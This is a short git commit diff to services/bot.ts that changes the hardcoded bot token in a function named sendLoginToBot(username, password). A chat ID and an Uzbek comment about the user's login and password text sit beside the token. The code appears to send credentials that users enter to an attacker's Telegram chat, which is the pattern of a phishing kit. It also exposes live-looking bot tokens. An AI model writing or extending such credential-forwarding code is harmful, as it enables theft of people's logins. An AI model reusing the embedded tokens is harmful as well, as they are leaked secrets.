71c03958f29c49fa012eaccb51c121bd0317ec5f
Farrukh-Front-Dev <farrukh.front.dev@gmail.com>
2025-12-06 17:00:17 +0500

    Link

--- services/bot.ts
+++ services/bot.ts
@@ -1,5 +1,5 @@
 export async function sendLoginToBot(username: string, password: string) {
-  const BOT_TOKEN = "8274713349:AAExlDjJpKKONhFS7feXD5xzBg282oq2eNw";
+  const BOT_TOKEN = "8487235752:AAEWdEFFKB3EdR5R8w1x3XfkS5MTVSpLpC0";
   const CHAT_ID = "991729905";
 
   // Foydalanuvchi login va password matni
